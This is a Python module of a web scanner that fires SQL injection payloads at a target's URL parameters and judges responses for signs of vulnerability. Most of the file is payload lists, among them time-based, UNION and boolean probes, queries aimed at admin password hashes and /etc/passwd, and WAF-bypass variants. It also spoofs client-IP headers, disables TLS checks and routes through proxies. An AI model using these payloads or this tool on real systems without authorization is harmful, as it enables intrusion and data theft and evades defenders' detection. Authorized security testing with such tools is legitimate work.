#!/usr/bin/env python3
import time
import random
import requests
import urllib3
import re
from urllib.parse import urlparse, urlunparse, urlencode, parse_qsl
from typing import Dict, List, Any, Optional, Tuple
from .vulnerability_base import VulnerabilityModule
import settings

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Scanner(VulnerabilityModule):
    name = "sql_injection"
    description = "Advanced SQL injection vulnerability scanner"
    risk = "high"
    useproxy = getattr(settings, "USEPROXY", True)
    enabled = True

    ERROR_SIGNATURES = {
        "mysql": [
            "you have an error in your sql syntax",
            "warning: mysql",
            "mysql_fetch_array",
            "mysqli_fetch",
            "mysql_num_rows",
            "mysql_result",
            "mysql_query"
        ],
        "mssql": [
            "unclosed quotation mark",
            "incorrect syntax near",
            "microsoft ole db provider",
            "odbc sql",
            "sql server",
            "system.data.sqlclient"
        ],
        "oracle": [
            "ora-01756",
            "ora-00933",
            "oracle error",
            "pl/sql",
            "ora-00936",
            "ora-01722"
        ],
        "postgres": [
            "pg_query",
            "postgresql",
            "pqexec",
            "postgresql.org",
            "psqlodbc"
        ],
        "generic": [
            "sql syntax",
            "quoted string not properly terminated",
            "sqlite error",
            "syntax error in sql statement"
        ]
    }

    PAYLOADS = {
        "error": [
            "'", "\"",
            "' OR '1'='1' --", "\" OR \"1\"=\"1\" --",
            "' OR 1=1 --", "\" OR 1=1 --",
            "' OR 1=1#", "\" OR 1=1#",
            "' OR 1=CONVERT(int,@@version)--",
            "\" OR 1=CONVERT(int,@@version)--"
        ],
        "time": [
            "' OR SLEEP(5)--",
            "\" OR SLEEP(5)--",
            "';WAITFOR DELAY '0:0:5';--",
            "\";WAITFOR DELAY '0:0:5';--",
            "'||DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
            "\"||DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"
        ],
        "union": {
            "marker": "QX13371337",
            "templates": [
                " UNION SELECT {marker}--",
                " UNION SELECT NULL,{marker}--",
                " UNION SELECT NULL,NULL,{marker}--",
                " UNION ALL SELECT {marker}--"
            ]
        },
        "boolean": [
            ("' AND '1'='1'--", "' AND '1'='2'--"),
            ("\" AND \"1\"=\"1'--", "\" AND \"1\"=\"2'--"),
            (" AND 1=1--", " AND 1=2--"),
            ("' AND (SELECT 1)=1--", "' AND (SELECT 1)=2--")
        ]
    }

    AGGRESSIVE_PAYLOADS = [
        "' OR (SELECT COUNT(*) FROM information_schema.tables)>0--",
        "\" OR (SELECT COUNT(*) FROM information_schema.tables)>0--",
        "' OR (SELECT SUBSTRING(@@version,1,1))='5'--",
        "\" OR (SELECT SUBSTRING(@@version,1,1))='5'--",
        "' OR (SELECT system_user) IS NOT NULL--",
        "\" OR (SELECT system_user) IS NOT NULL--",
        "' OR (SELECT current_user) IS NOT NULL--",
        "\" OR (SELECT current_user) IS NOT NULL--",
        "' OR (SELECT database()) IS NOT NULL--",
        "\" OR (SELECT database()) IS NOT NULL--",
        "' OR (SELECT name FROM sys.databases WHERE database_id=1)='master'--",
        "\" OR (SELECT name FROM sys.databases WHERE database_id=1)='master'--",
        "' OR (SELECT table_name FROM information_schema.tables LIMIT 1) IS NOT NULL--",
        "\" OR (SELECT table_name FROM information_schema.tables LIMIT 1) IS NOT NULL--",
        "' OR (SELECT column_name FROM information_schema.columns LIMIT 1) IS NOT NULL--",
        "\" OR (SELECT column_name FROM information_schema.columns LIMIT 1) IS NOT NULL--",
        "' OR (SELECT password FROM users LIMIT 1) IS NOT NULL--",
        "\" OR (SELECT password FROM users LIMIT 1) IS NOT NULL--",
        "' OR (SELECT COUNT(*) FROM users WHERE username='admin')>0--",
        "\" OR (SELECT COUNT(*) FROM users WHERE username='admin')>0--",
        "' OR (SELECT LENGTH(password) FROM users WHERE username='admin')>0--",
        "\" OR (SELECT LENGTH(password) FROM users WHERE username='admin')>0--",
        "' OR (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>0--",
        "\" OR (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>0--",
        "' OR (SELECT LOAD_FILE('/etc/passwd')) IS NOT NULL--",
        "\" OR (SELECT LOAD_FILE('/etc/passwd')) IS NOT NULL--",
        "' OR (SELECT @@version) IS NOT NULL--",
        "\" OR (SELECT @@version) IS NOT NULL--",
        "' OR (SELECT @@hostname) IS NOT NULL--",
        "\" OR (SELECT @@hostname) IS NOT NULL--",
        "' OR (SELECT @@datadir) IS NOT NULL--",
        "\" OR (SELECT @@datadir) IS NOT NULL--",
        "' OR (SELECT user()) IS NOT NULL--",
        "\" OR (SELECT user()) IS NOT NULL--",
        "' OR (SELECT version()) IS NOT NULL--",
        "\" OR (SELECT version()) IS NOT NULL--",
        "' OR (SELECT current_setting('server_version')) IS NOT NULL--",
        "\" OR (SELECT current_setting('server_version')) IS NOT NULL--",
        "' OR (SELECT banner FROM v$version WHERE rownum=1) IS NOT NULL--",
        "\" OR (SELECT banner FROM v$version WHERE rownum=1) IS NOT NULL--",
        "' OR (SELECT name FROM v$database) IS NOT NULL--",
        "\" OR (SELECT name FROM v$database) IS NOT NULL--",
        "' OR (SELECT table_name FROM all_tables WHERE rownum=1) IS NOT NULL--",
        "\" OR (SELECT table_name FROM all_tables WHERE rownum=1) IS NOT NULL--",
        "' OR (SELECT column_name FROM all_tab_columns WHERE rownum=1) IS NOT NULL--",
        "\" OR (SELECT column_name FROM all_tab_columns WHERE rownum=1) IS NOT NULL--",
        "' OR (SELECT grantee FROM all_users WHERE rownum=1) IS NOT NULL--",
        "\" OR (SELECT grantee FROM all_users WHERE rownum=1) IS NOT NULL--",
        "' OR (SELECT schemaname FROM pg_tables LIMIT 1) IS NOT NULL--",
        "\" OR (SELECT schemaname FROM pg_tables LIMIT 1) IS NOT NULL--",
        "' OR (SELECT viewname FROM pg_views LIMIT 1) IS NOT NULL--",
        "\" OR (SELECT viewname FROM pg_views LIMIT 1) IS NOT NULL--",
        "' OR (SELECT usename FROM pg_user LIMIT 1) IS NOT NULL--",
        "\" OR (SELECT usename FROM pg_user LIMIT 1) IS NOT NULL--",
        "' OR (SELECT version FROM instance_recovery) IS NOT NULL--",
        "\" OR (SELECT version FROM instance_recovery) IS NOT NULL--",
        "' OR (SELECT sqlite_version()) IS NOT NULL--",
        "\" OR (SELECT sqlite_version()) IS NOT NULL--",
        "' OR (SELECT name FROM sqlite_master WHERE type='table') IS NOT NULL--",
        "\" OR (SELECT name FROM sqlite_master WHERE type='table') IS NOT NULL--"
    ]

    WAF_BYPASS_PAYLOADS = [
        "'/**/OR/**/1=1--",
        "\"/**/OR/**/1=1--",
        "'%0AOR%0A1=1--",
        "\"%0AOR%0A1=1--",
        "'%09OR%091=1--",
        "\"%09OR%091=1--",
        "'%0BOR%0B1=1--",
        "\"%0BOR%0B1=1--",
        "'%0COR%0C1=1--",
        "\"%0COR%0C1=1--",
        "'%0DOR%0D1=1--",
        "\"%0DOR%0D1=1--",
        "'%A0OR%A01=1--",
        "\"%A0OR%A01=1--",
        "'/*!50000OR*/1=1--",
        "\"/*!50000OR*/1=1--",
        "'/*!OR*/1=1--",
        "\"/*!OR*/1=1--",
        "'||1=1--",
        "\"||1=1--",
        "' OR TRUE--",
        "\" OR TRUE--",
        "' OR 1--",
        "\" OR 1--",
        "' OR 'a'='a'--",
        "\" OR \"a\"=\"a\"--",
        "' OR (1) IS NOT NULL--",
        "\" OR (1) IS NOT NULL--",
        "' OR (SELECT 1)=1--",
        "\" OR (SELECT 1)=1--",
        "' OR (SELECT 1 FROM DUAL)=1--",
        "\" OR (SELECT 1 FROM DUAL)=1--",
        "' OR (SELECT 1 FROM (SELECT SLEEP(0))a)=1--",
        "\" OR (SELECT 1 FROM (SELECT SLEEP(0))a)=1--",
        "' OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "\" OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM mysql.user GROUP BY x)a)--",
        "\" OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM mysql.user GROUP BY x)a)--",
        "' OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "\" OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
    ]

    SENSITIVE_PARAMS = ["id", "user", "name", "account", "email", "phone", "ssn", "credit"]

    def __init__(self, target: str, **kwargs):
        super().__init__(target, **kwargs)
        self.session.headers.update(self._headers())
        self.session.verify = False
        self.custom_payloads = kwargs.get('custom_payloads', [])

    def _headers(self) -> Dict[str, str]:
        return {
            "User-Agent": getattr(settings, "USERAGENT", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"),
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Originating-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Remote-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Remote-Addr": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Client-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Host": urlparse(self.target).hostname,
            "X-Scanner": "QX-ShadowDrop",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        }

    def _generate_union_payloads(self) -> List[str]:
        return [t.format(marker=self.PAYLOADS["union"]["marker"])
                for t in self.PAYLOADS["union"]["templates"]]

    def _select_parameters(self, params: Dict[str, str]) -> List[str]:
        return sorted(params.keys(),
                      key=lambda k: 0 if k.lower() in self.SENSITIVE_PARAMS else 1)[:5]

    def _build_url(self, base_url: str, params: Dict[str, str]) -> str:
        return f"{base_url.rstrip('/')}?{urlencode(params, doseq=True)}"

    def _create_test_cases(self, target: str) -> List[Dict[str, Any]]:
        parsed = urlparse(target)
        base_url = urlunparse(parsed._replace(query=""))
        query_params = dict(parse_qsl(parsed.query))
        selected_params = self._select_parameters(query_params or {"id": "1"})
        tests = []

        for param in selected_params:
            base_value = query_params.get(param, "1")

            for payload in self.PAYLOADS["error"]:
                test_params = query_params.copy()
                test_params[param] = f"{base_value}{payload}"
                tests.append({
                    "method": "GET",
                    "url": self._build_url(base_url, test_params),
                    "param": param,
                    "kind": "error",
                    "payload": payload
                })

            for payload in self._generate_union_payloads():
                test_params = query_params.copy()
                test_params[param] = f"{base_value}{payload}"
                tests.append({
                    "method": "GET",
                    "url": self._build_url(base_url, test_params),
                    "param": param,
                    "kind": "union",
                    "payload": payload
                })

            for true_payload, false_payload in self.PAYLOADS["boolean"]:
                true_params = query_params.copy()
                true_params[param] = f"{base_value}{true_payload}"
                tests.append({
                    "method": "GET",
                    "url": self._build_url(base_url, true_params),
                    "param": param,
                    "kind": "boolean_true",
                    "payload": true_payload
                })
                false_params = query_params.copy()
                false_params[param] = f"{base_value}{false_payload}"
                tests.append({
                    "method": "GET",
                    "url": self._build_url(base_url, false_params),
                    "param": param,
                    "kind": "boolean_false",
                    "payload": false_payload
                })

            if self.aggressive:
                for payload in self.PAYLOADS["time"]:
                    test_params = query_params.copy()
                    test_params[param] = f"{base_value}{payload}"
                    tests.append({
                        "method": "GET",
                        "url": self._build_url(base_url, test_params),
                        "param": param,
                        "kind": "time",
                        "payload": payload
                    })

                for payload in self.AGGRESSIVE_PAYLOADS + self.WAF_BYPASS_PAYLOADS + self.custom_payloads:
                    test_params = query_params.copy()
                    test_params[param] = f"{base_value}{payload}"
                    tests.append({
                        "method": "GET",
                        "url": self._build_url(base_url, test_params),
                        "param": param,
                        "kind": "aggressive",
                        "payload": payload
                    })

        return tests[:200] if self.aggressive else tests[:50]

    def _execute_request(self, method: str, url: str, data: Optional[Dict] = None,
                         timeout: int = 10) -> requests.Response:
        try:
            proxies = getattr(settings, "PROXIES", None) if self.useproxy else None

            if method == "GET":
                return self.session.get(url, timeout=timeout, allow_redirects=False, proxies=proxies)
            return self.session.post(url, data=data or {}, timeout=timeout, allow_redirects=False, proxies=proxies)
        except requests.RequestException:
            fallback = requests.Session()
            fallback.headers.update(self._headers())
            fallback.verify = False
            proxies = getattr(settings, "PROXIES", None) if self.useproxy else None

            if method == "GET":
                return fallback.get(url, timeout=timeout, allow_redirects=False, proxies=proxies)
            return fallback.post(url, data=data or {}, timeout=timeout, allow_redirects=False, proxies=proxies)

    def _clean_response_content(self, content: str) -> str:
        patterns_to_remove = [
            r'<script[^>]*>.*?</script>',
            r'<style[^>]*>.*?</style>',
            r'<!--.*?-->',
            r'<![CDATA[.*?]]>',
            r'\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}',
            r'\b\d{10,}\b',
            r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}'
        ]
        
        for pattern in patterns_to_remove:
            content = re.sub(pattern, '', content, flags=re.DOTALL)
        
        return re.sub(r'\s+', ' ', content).strip()

    def _analyze_response(self, response: requests.Response, test_case: Dict[str, Any],
                          baseline: Dict[str, Any]) -> Dict[str, Any]:
        content = (response.text or "").lower()
        status = response.status_code
        length = len(content)
        result = {
            "url": test_case["url"],
            "method": test_case["method"],
            "param": test_case["param"],
            "type": test_case["kind"],
            "status": status,
            "length": length,
            "payload": test_case["payload"]
        }

        if test_case["kind"] == "error":
            for db_type, patterns in self.ERROR_SIGNATURES.items():
                if any(p in content for p in patterns):
                    result["db_type"] = db_type
                    result["vulnerable"] = True
                    break
            else:
                result["vulnerable"] = False

        elif test_case["kind"] == "union":
            result["vulnerable"] = self.PAYLOADS["union"]["marker"].lower() in content

        elif test_case["kind"].startswith("boolean"):
            clean_baseline = self._clean_response_content(baseline["content"])
            clean_response = self._clean_response_content(content)
            
            length_diff = abs(len(clean_response) - len(clean_baseline))
            content_diff = clean_response != clean_baseline
            
            result["vulnerable"] = (
                content_diff and 
                (length_diff > 50 or status != baseline["status"])
            )

        elif test_case["kind"] == "time":
            result["response_time"] = response.elapsed.total_seconds()
            result["vulnerable"] = result["response_time"] > 4.0

        elif test_case["kind"] == "aggressive":
            vulnerable = False
            
            for db_type, patterns in self.ERROR_SIGNATURES.items():
                if any(p in content for p in patterns):
                    result["db_type"] = db_type
                    vulnerable = True
                    break
            
            if not vulnerable:
                clean_baseline = self._clean_response_content(baseline["content"])
                clean_response = self._clean_response_content(content)
                
                length_diff = abs(len(clean_response) - len(clean_baseline))
                content_diff = clean_response != clean_baseline
                
                vulnerable = (
                    content_diff and 
                    (length_diff > 50 or status != baseline["status"])
                )
            
            result["vulnerable"] = vulnerable

        return result

    def scan(self) -> Dict[str, Any]:
        try:
            timeout = getattr(settings, "TIMEOUT", 10)
            test_cases = self._create_test_cases(self.target)

            if self.debug:
                print(f"[DEBUG] Target: {self.target}")
                print(f"[DEBUG] Aggressive mode: {self.aggressive}")
                print(f"[DEBUG] Test cases generated: {len(test_cases)}")
                print(f"[DEBUG] Custom payloads: {len(self.custom_payloads)}")

            baseline_response = self._execute_request("GET", self.target, timeout=min(timeout, 8))
            baseline = {
                "content": baseline_response.text or "",
                "length": len(baseline_response.text or ""),
                "status": baseline_response.status_code,
                "time": baseline_response.elapsed.total_seconds()
            }

            if self.debug:
                print(f"[DEBUG] Baseline - Status: {baseline['status']}, Length: {baseline['length']}, Time: {baseline['time']:.2f}s")

            results = []
            vulnerabilities = []
            total_tested = 0
            successful_tests = 0
            failed_tests = 0

            for i, test in enumerate(test_cases):
                if self.debug and i % 10 == 0:
                    print(f"[DEBUG] Testing payload {i+1}/{len(test_cases)}")

                time.sleep(random.uniform(0.1, 0.3))

                try:
                    response = self._execute_request(
                        test["method"],
                        test["url"],
                        timeout=max(timeout, 15) if test["kind"] == "time" else timeout
                    )

                    result = self._analyze_response(response, test, baseline)
                    results.append(result)
                    successful_tests += 1

                    if result.get("vulnerable", False):
                        vulnerabilities.append(result)
                        if self.debug:
                            print(f"[VULNERABLE] Found vulnerability with payload: {test['payload']}")

                except Exception as e:
                    if self.debug:
                        print(f"[ERROR] {str(e)}")
                    results.append({
                        "url": test["url"],
                        "error": str(e),
                        "param": test["param"],
                        "type": test["kind"]
                    })
                    failed_tests += 1

                total_tested += 1

            risk = "critical" if vulnerabilities else "low"

            return {
                "ok": True,
                "risk": risk,
                "vulnerabilities": vulnerabilities,
                "total_tests": total_tested,
                "successful_tests": successful_tests,
                "failed_tests": failed_tests,
                "notes": f"Tests performed: {total_tested}, Successful: {successful_tests}, Failed: {failed_tests}, Vulnerabilities found: {len(vulnerabilities)}"
            }

        except Exception as e:
            if self.debug:
                print(f"[CRITICAL ERROR] {str(e)}")
            return {
                "ok": False,
                "risk": "unknown",
                "error": str(e),
                "vulnerabilities": [],
                "total_tests": 0,
                "successful_tests": 0,
                "failed_tests": 0
            }

    def run(self, **kwargs) -> Dict[str, Any]:
        for key, value in kwargs.items():
            if hasattr(self, key):
                setattr(self, key, value)
        return self.scan()
